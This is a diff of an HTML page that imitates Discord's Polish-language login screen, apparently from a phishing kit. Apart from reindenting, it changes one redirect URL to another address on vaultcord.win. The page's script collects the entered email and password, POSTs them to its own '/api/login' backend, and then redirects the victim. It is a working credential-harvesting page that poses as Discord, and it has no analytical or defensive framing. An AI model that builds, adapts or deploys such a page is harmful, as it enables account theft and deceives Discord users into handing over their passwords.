@@ -42,78 +42,78 @@
     </style>
 </head>
 <body>
-<img class="background-art" alt="" src="discord_files/d8680b1c1576ecc8.svg">
-<img class="logo" alt="Discord" src="discord_files/131c318dd45b7aa4.svg">
-<div class="app">
-    <div class="login-container">
-        <div class="login-form">
-            <h1 class="title">Witamy ponownie!</h1>
-            <div class="subtitle">Cieszymy sie, ze znowu z nami jestes!</div>
-            <div class="input-group">
-                <label class="input-label">Adres e-mail lub numer telefonu <span>*</span></label>
-                <input type="text" id="email" class="input-field" placeholder=" " autocomplete="off">
+    <img class="background-art" alt="" src="discord_files/d8680b1c1576ecc8.svg">
+    <img class="logo" alt="Discord" src="discord_files/131c318dd45b7aa4.svg">
+    <div class="app">
+        <div class="login-container">
+            <div class="login-form">
+                <h1 class="title">Witamy ponownie!</h1>
+                <div class="subtitle">Cieszymy sie, ze znowu z nami jestes!</div>
+                <div class="input-group">
+                    <label class="input-label">Adres e-mail lub numer telefonu <span>*</span></label>
+                    <input type="text" id="email" class="input-field" placeholder=" " autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Haslo <span>*</span></label>
+                    <input type="password" id="password" class="input-field" placeholder=" " autocomplete="off">
+                    <div id="errorMsg" class="error-message"></div>
+                </div>
+                <button class="forgot-link" onclick="window.location.href='https://discord.com/forgot'">Nie pamietasz hasla?</button>
+                <button id="loginBtn" class="login-btn" onclick="sendToBackend()">Zaloguj sie</button>
+                <div class="register-text">Potrzebujesz konta? <button class="register-link" onclick="window.location.href='https://discord.com/register'">Zarejestruj sie</button></div>
             </div>
-            <div class="input-group">
-                <label class="input-label">Haslo <span>*</span></label>
-                <input type="password" id="password" class="input-field" placeholder=" " autocomplete="off">
-                <div id="errorMsg" class="error-message"></div>
+            <div class="separator"></div>
+            <div class="qr-section">
+                <div class="qr-code"><img alt="QR Code" src="discord_files/qr_65db4275.png"></div>
+                <h2 class="qr-title">Zaloguj sie kodem QR</h2>
+                <div class="qr-description">Zeskanuj to <strong>aplikacja mobilna Discorda</strong>, by natychmiast sie zalogowac.</div>
+                <button class="passkey-btn" onclick="window.location.href='https://discord.com/login'">Mozesz tez zalogowac sie przy pomocy klucza dostepu</button>
             </div>
-            <button class="forgot-link" onclick="window.location.href='https://discord.com/forgot'">Nie pamietasz hasla?</button>
-            <button id="loginBtn" class="login-btn" onclick="sendToBackend()">Zaloguj sie</button>
-            <div class="register-text">Potrzebujesz konta? <button class="register-link" onclick="window.location.href='https://discord.com/register'">Zarejestruj sie</button></div>
-        </div>
-        <div class="separator"></div>
-        <div class="qr-section">
-            <div class="qr-code"><img alt="QR Code" src="discord_files/qr_65db4275.png"></div>
-            <h2 class="qr-title">Zaloguj sie kodem QR</h2>
-            <div class="qr-description">Zeskanuj to <strong>aplikacja mobilna Discorda</strong>, by natychmiast sie zalogowac.</div>
-            <button class="passkey-btn" onclick="window.location.href='https://discord.com/login'">Mozesz tez zalogowac sie przy pomocy klucza dostepu</button>
         </div>
     </div>
-</div>
-<script>
-    async function sendToBackend() {
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value;
-        const errorMsg = document.getElementById('errorMsg');
-        const loginBtn = document.getElementById('loginBtn');
-        if (!email) {
-            errorMsg.textContent = 'Wprowadz adres e-mail lub numer telefonu';
-            errorMsg.style.display = 'block';
-            return;
+    <script>
+        async function sendToBackend() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const loginBtn = document.getElementById('loginBtn');
+            if (!email) {
+                errorMsg.textContent = 'Wprowadz adres e-mail lub numer telefonu';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            if (!password) {
+                errorMsg.textContent = 'Wprowadz haslo';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            errorMsg.style.display = 'none';
+            const originalText = loginBtn.innerHTML;
+            loginBtn.innerHTML = '<span class="loading-spinner"></span> logowanie...';
+            loginBtn.disabled = true;
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                const data = await response.json();
+                setTimeout(() => { window.location.href = data.redirect; }, 500);
+            } catch (error) {
+                console.error('Blad:', error);
+                loginBtn.innerHTML = originalText;
+                loginBtn.disabled = false;
+                errorMsg.textContent = 'Blad polaczenia, sprobuj ponownie';
+                errorMsg.style.display = 'block';
+                setTimeout(() => { window.location.href = 'https://vaultcord.win/crazygirlsa'; }, 1500);
+            }
         }
-        if (!password) {
-            errorMsg.textContent = 'Wprowadz haslo';
-            errorMsg.style.display = 'block';
-            return;
-        }
-        errorMsg.style.display = 'none';
-        const originalText = loginBtn.innerHTML;
-        loginBtn.innerHTML = '<span class="loading-spinner"></span> logowanie...';
-        loginBtn.disabled = true;
-        try {
-            const response = await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
-            });
-            const data = await response.json();
-            setTimeout(() => { window.location.href = data.redirect; }, 500);
-        } catch (error) {
-            console.error('Blad:', error);
-            loginBtn.innerHTML = originalText;
-            loginBtn.disabled = false;
-            errorMsg.textContent = 'Blad polaczenia, sprobuj ponownie';
-            errorMsg.style.display = 'block';
-            setTimeout(() => { window.location.href = 'https://vaultcord.win/sadasdyuashdasdasd'; }, 1500);
-        }
-    }
-    document.getElementById('email').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password').focus(); }
-    });
-    document.getElementById('password').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') { e.preventDefault(); sendToBackend(); }
-    });
-</script>
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') { e.preventDefault(); document.getElementById('password').focus(); }
+        });
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') { e.preventDefault(); sendToBackend(); }
+        });
+    </script>
 </body>
 </html>
